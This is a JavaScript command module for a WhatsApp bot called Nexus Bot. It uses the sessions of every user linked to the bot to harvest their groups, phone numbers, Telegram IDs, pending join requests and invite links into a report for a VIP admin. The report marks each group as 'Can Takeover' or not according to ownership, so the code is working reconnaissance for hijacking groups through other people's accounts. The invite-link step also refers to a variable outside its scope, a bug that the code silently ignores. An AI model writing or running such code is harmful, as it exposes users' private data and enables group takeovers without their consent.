import { VIPQueries } from "../../database/query.js"
import { VIPHelper } from "../../whatsapp/index.js"
import { getSessionManager } from "../../whatsapp/index.js"
import fs from 'fs/promises'
import path from 'path'

export default {
  name: "vipallgroups",
  commands: ["vipallgroups", "allgroups", "allconnectedgroups"],
  description: "Get all groups from all connected users (Default VIP only)",
  adminOnly: true,
  usage: ".vipallgroups - Export all groups to file",
        permissions: {
  defaultVipOnly: true,
  privateOnly: true
},
  
  async execute(sock, sessionId, args, m) {
    try {
      // Get session manager
      const sessionManager = getSessionManager()
      
      if (!sessionManager) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Session manager not available\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return { success: false, error: "Session manager unavailable" }
      }

      // Send initial message
      await sock.sendMessage(m.chat, { 
        text: "🔍 *Fetching All Groups...*\n\n" +
          "This may take several minutes...\n" +
          "Please wait while we scan all connected users.\n\n" +
          "> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
      }, { quoted: m })

      // Get all sessions from database
      const allSessions = await sessionManager.getAllSessions()
      
      if (!allSessions || allSessions.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: "📊 *No sessions found in database*\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return { success: true, connectedCount: 0 }
      }

      // Collect all groups from all users
      const allUsersGroups = []
      let processedUsers = 0
      let totalGroups = 0
      
      for (const session of allSessions) {
        const sessionId = session.sessionId || `session_${session.telegramId}`
        
        try {
          // Check if session is connected
          const isConnected = await sessionManager.isReallyConnected(sessionId)
          
          if (!isConnected) {
            continue
          }

          // Get user's socket
          const userSock = sessionManager.getSession(sessionId)
          
          if (!userSock || !userSock.user) {
            continue
          }

          // Get user's phone
          const userPhone = session.phoneNumber || userSock.user.id.split('@')[0].split(':')[0]
          
          // Fetch groups for this user
          const userGroups = await VIPHelper.getUserGroups(userSock)
          
          if (userGroups.length > 0) {
            // Check pending requests for each group
            const groupsWithPending = await Promise.all(
              userGroups.map(async (group) => {
                let pendingCount = 0
                try {
                  const requests = await userSock.groupRequestParticipantsList(group.jid)
                  pendingCount = requests?.length || 0
                } catch (error) {
                  // Ignore error - group might not have pending requests feature
                }
                
                return {
                  ...group,
                  pendingRequests: pendingCount
                }
              })
            )
            
            allUsersGroups.push({
              telegramId: session.telegramId,
              phone: userPhone,
              source: session.source || 'telegram',
              groups: groupsWithPending
            })
            
            totalGroups += groupsWithPending.length
            processedUsers++
          }
          
        } catch (error) {
          console.error(`[VIPAllGroups] Error processing ${sessionId}:`, error)
        }
      }

      if (totalGroups === 0) {
        await sock.sendMessage(m.chat, { 
          text: "📭 *No Groups Found*\n\n" +
            "None of the connected users are in any groups.\n\n" +
            "> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return { success: true, totalGroups: 0 }
      }

      // Build text file content
      let fileContent = "═══════════════════════════════════════════════════════════\n"
      fileContent += "                   ALL CONNECTED USERS GROUPS                    \n"
      fileContent += "═══════════════════════════════════════════════════════════\n\n"
      fileContent += `📊 SUMMARY\n`
      fileContent += `├─ Total Connected Users: ${processedUsers}\n`
      fileContent += `├─ Total Groups Found: ${totalGroups}\n`
      fileContent += `└─ Generated: ${new Date().toLocaleString()}\n\n`
      fileContent += "═══════════════════════════════════════════════════════════\n\n"

      // Add each user's groups
      for (let userIndex = 0; userIndex < allUsersGroups.length; userIndex++) {
        const userData = allUsersGroups[userIndex]
        
        fileContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`
        fileContent += `👤 USER ${userIndex + 1}: ${userData.phone}\n`
        fileContent += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`
        fileContent += `📱 Phone: ${userData.phone}\n`
        fileContent += `🆔 Telegram ID: ${userData.telegramId}\n`
        fileContent += `📲 Source: ${userData.source === 'web' ? 'Web' : 'Telegram'}\n`
        fileContent += `📊 Total Groups: ${userData.groups.length}\n\n`
        fileContent += `─────────────────────────────────────────────────────────────\n\n`
        
        // Add each group
        for (let i = 0; i < userData.groups.length; i++) {
          const group = userData.groups[i]
          
          fileContent += `   ${i + 1}. ${group.name}\n`
          fileContent += `   ├─ 👥 Members: ${group.participants}\n`
          
          // Ownership status
          if (group.isBotOwner) {
            fileContent += `   ├─ 👑 Status: Owner (Can Takeover)\n`
          } else if (!group.hasOtherOwner) {
            fileContent += `   ├─ 🔓 Status: Admin - No Owner (Can Takeover)\n`
          } else if (group.ownerIsBanned) {
            fileContent += `   ├─ 🔶 Status: Admin - Owner Banned (Can Takeover)\n`
          } else {
            fileContent += `   ├─ ⚠️  Status: Admin - Has Active Owner (Cannot Takeover)\n`
          }
          
          // Pending requests
          if (group.pendingRequests > 0) {
            fileContent += `   ├─ 📩 Pending Requests: ${group.pendingRequests}\n`
          } else {
            fileContent += `   ├─ 📩 Pending Requests: None\n`
          }
          
          // Group invite link
          try {
            const link = await VIPHelper.getGroupInviteLink(userSock || sock, group.jid)
            if (link) {
              fileContent += `   ├─ 🔗 Link: ${link}\n`
            }
          } catch (error) {
            // Ignore link error
          }
          
          fileContent += `   └─ 🆔 JID: ${group.jid}\n\n`
        }
        
        fileContent += `\n`
      }

      fileContent += "═══════════════════════════════════════════════════════════\n"
      fileContent += "                         END OF REPORT                          \n"
      fileContent += "═══════════════════════════════════════════════════════════\n\n"
      fileContent += `Generated by: Nexus Bot VIP System\n`
      fileContent += `Timestamp: ${new Date().toISOString()}\n`
      fileContent += `Total Users: ${processedUsers} | Total Groups: ${totalGroups}\n\n`
      fileContent += `© 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙\n`

      // Save to file
      const fileName = `all_groups_${Date.now()}.txt`
      const filePath = path.join(process.cwd(), 'temp', fileName)
      
      // Ensure temp directory exists
      await fs.mkdir(path.join(process.cwd(), 'temp'), { recursive: true })
      
      // Write file
      await fs.writeFile(filePath, fileContent, 'utf8')

      // Send file
      await sock.sendMessage(m.chat, {
        document: { url: filePath },
        fileName: fileName,
        mimetype: 'text/plain',
        caption: `📄 *All Groups Report*\n\n` +
          `👥 Users Processed: ${processedUsers}\n` +
          `📊 Total Groups: ${totalGroups}\n` +
          `⏰ Generated: ${new Date().toLocaleString()}\n\n` +
          `> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
      }, { quoted: m })

      // Clean up file after sending (with delay)
      setTimeout(async () => {
        try {
          await fs.unlink(filePath)
        } catch (error) {
          console.error('[VIPAllGroups] Error cleaning up file:', error)
        }
      }, 30000) // Delete after 30 seconds

      return { 
        success: true, 
        processedUsers,
        totalGroups,
        fileName
      }

    } catch (error) {
      console.error("[VIPAllGroups] Error:", error)
      await sock.sendMessage(m.chat, { 
        text: `❌ *Error fetching all groups*\n\n${error.message}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })
      return { success: false, error: error.message }
    }
  }
}